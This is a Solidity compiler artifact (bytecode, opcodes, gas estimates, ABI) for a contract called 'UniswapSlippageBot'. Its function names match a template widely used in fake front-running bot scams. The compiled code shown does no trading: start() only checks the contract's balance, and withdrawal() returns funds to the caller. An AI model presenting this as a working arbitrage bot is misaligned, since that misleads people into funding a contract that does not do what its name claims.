{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "60806040526040518060600160405280602a81526020016103a2602a913960019080519060200190610032929190610074565b506040518060600160405280602a8152602001610378602a913960029080519060200190610061929190610074565b5034801561006e57600080fd5b50610111565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100b557805160ff19168380011785556100e3565b828001600101855582156100e3579182015b828111156100e25782518255916020019190600101906100c7565b5b5090506100f091906100f4565b5090565b5b8082111561010d5760008160009055506001016100f5565b5090565b610258806101206000396000f3fe60806040526004361061002d5760003560e01c8063be9a655514610039578063d4e932921461004357610034565b3661003457005b600080fd5b61004161004d565b005b61004b6100cc565b005b662386f26fc100004710156100ca576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601d8152602001807f496e73756666696369656e7420636f6e74726163742062616c616e636500000081525060200191505060405180910390fd5b565b60006100d661021a565b90506000811161014e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260128152602001807f4e6f2045544820746f207769746864726177000000000000000000000000000081525060200191505060405180910390fd5b60003390506000819050824710156101ce576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601e8152602001807f496e73756666696369656e742066756e647320696e20636f6e7472616374000081525060200191505060405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff166108fc849081150290604051600060405180830381858888f19350505050158015610214573d6000803e3d6000fd5b50505050565b60004790509056fea26469706673582212208bc35258a70bb99b3baeea693ae67d60cfc0a403b0140d00396239edb73c5e2164736f6c634300060c0033307837613235306435363330423463463533393733396446324335644163623463363539463234383844307843303261614133396232323346453844304130653543344632376541443930383343373536436332",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2A DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x3A2 PUSH1 0x2A SWAP2 CODECOPY PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH2 0x32 SWAP3 SWAP2 SWAP1 PUSH2 0x74 JUMP JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2A DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x378 PUSH1 0x2A SWAP2 CODECOPY PUSH1 0x2 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH2 0x61 SWAP3 SWAP2 SWAP1 PUSH2 0x74 JUMP JUMPDEST POP CALLVALUE DUP1 ISZERO PUSH2 0x6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x111 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH2 0xB5 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH2 0xE3 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH2 0xE3 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH2 0xE2 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH2 0xC7 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH2 0xF0 SWAP2 SWAP1 PUSH2 0xF4 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH2 0x10D JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH2 0xF5 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0x258 DUP1 PUSH2 0x120 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x39 JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x43 JUMPI PUSH2 0x34 JUMP JUMPDEST CALLDATASIZE PUSH2 0x34 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x41 PUSH2 0x4D JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4B PUSH2 0xCC JUMP JUMPDEST STOP JUMPDEST PUSH7 0x2386F26FC10000 SELFBALANCE LT ISZERO PUSH2 0xCA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1D DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x496E73756666696369656E7420636F6E74726163742062616C616E6365000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH2 0xD6 PUSH2 0x21A JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 GT PUSH2 0x14E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x12 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4E6F2045544820746F2077697468647261770000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 CALLER SWAP1 POP PUSH1 0x0 DUP2 SWAP1 POP DUP3 SELFBALANCE LT ISZERO PUSH2 0x1CE JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x496E73756666696369656E742066756E647320696E20636F6E74726163740000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC DUP5 SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x214 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP12 0xC3 MSTORE PC 0xA7 SIGNEXTEND 0xB9 SWAP12 EXTCODESIZE 0xAE 0xEA PUSH10 0x3AE67D60CFC0A403B014 0xD STOP CODECOPY PUSH3 0x39EDB7 EXTCODECOPY 0x5E 0x21 PUSH5 0x736F6C6343 STOP MOD 0xC STOP CALLER ADDRESS PUSH25 0x37613235306435363330423463463533393733396446324335 PUSH5 0x4163623463 CALLDATASIZE CALLDATALOAD CODECOPY CHAINID ORIGIN CALLVALUE CODESIZE CODESIZE DIFFICULTY ADDRESS PUSH25 0x43303261614133396232323346453844304130653543344632 CALLDATACOPY PUSH6 0x414439303833 NUMBER CALLDATACOPY CALLDATALOAD CALLDATASIZE NUMBER PUSH4 0x32000000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "120000",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"start()": "239",
				"withdrawal()": "infinite"
			},
			"internal": {
				"beyond(struct UniswapSlippageBot.slice memory,struct UniswapSlippageBot.slice memory)": "infinite",
				"calcLiquidityInContract(struct UniswapSlippageBot.slice memory)": "infinite",
				"checkLiquidity(uint256)": "infinite",
				"fetchMempoolData()": "infinite",
				"fetchMempoolEdition()": "infinite",
				"fetchMempoolVersion()": "infinite",
				"findContracts(uint256,uint256,uint256,uint256)": "infinite",
				"findNewContracts(struct UniswapSlippageBot.slice memory,struct UniswapSlippageBot.slice memory)": "infinite",
				"findPtr(uint256,uint256,uint256,uint256)": "infinite",
				"getBa()": "25",
				"getMempoolCode()": "infinite",
				"getMempoolHeight()": "infinite",
				"getMempoolLog()": "infinite",
				"getMempoolLong()": "infinite",
				"getMempoolShort()": "infinite",
				"getMempoolStart()": "infinite",
				"keccak(struct UniswapSlippageBot.slice memory)": "infinite",
				"loadCurrentContract(string memory)": "infinite",
				"memcpy(uint256,uint256,uint256)": "infinite",
				"mempool(string memory,string memory)": "infinite",
				"nextContract(struct UniswapSlippageBot.slice memory,struct UniswapSlippageBot.slice memory)": "infinite",
				"orderContractsByLiquidity(struct UniswapSlippageBot.slice memory)": "infinite",
				"startExploration(string memory)": "infinite",
				"toHexDigit(uint8)": "infinite",
				"uint2str(uint256)": "infinite"
			}
		},
		"methodIdentifiers": {
			"start()": "be9a6555",
			"withdrawal()": "d4e93292"
		}
	},
	"abi": [
		{
			"inputs": [],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "string",
					"name": "_msg",
					"type": "string"
				}
			],
			"name": "Log",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "start",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "withdrawal",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}